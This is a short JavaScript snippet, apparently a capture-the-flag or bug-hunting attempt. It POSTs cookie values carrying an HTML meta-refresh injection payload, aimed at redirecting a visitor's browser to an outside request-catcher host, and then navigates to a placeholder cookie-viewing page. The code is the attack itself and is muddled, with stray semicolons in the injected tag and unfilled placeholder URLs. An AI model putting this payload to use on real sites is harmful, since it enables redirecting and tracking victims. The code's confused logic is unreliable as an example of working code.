// Function to make a POST request with fetch
async function makePostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    return await response.json();
}

// Define meta cookies
const metaCookies = 'a=<meta ; http-equiv="refresh" ; content="0;url=https://hi.requestcatcher.com/">';

// Make four POST requests to set cookies
for (let i = 0; i < 4; i++) {
    const url = 'https://example.com/set-cookies';  // Replace with your server endpoint
    const data = { cookie: `cookie_${i}`, value: `value_${i}`, meta: metaCookies };
    
    makePostRequest(url, data)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });
}

// Redirect to view cookie URL after setting cookies
window.location.href = 'view_cookie_url';  // Replace with the actual URL to view cookies
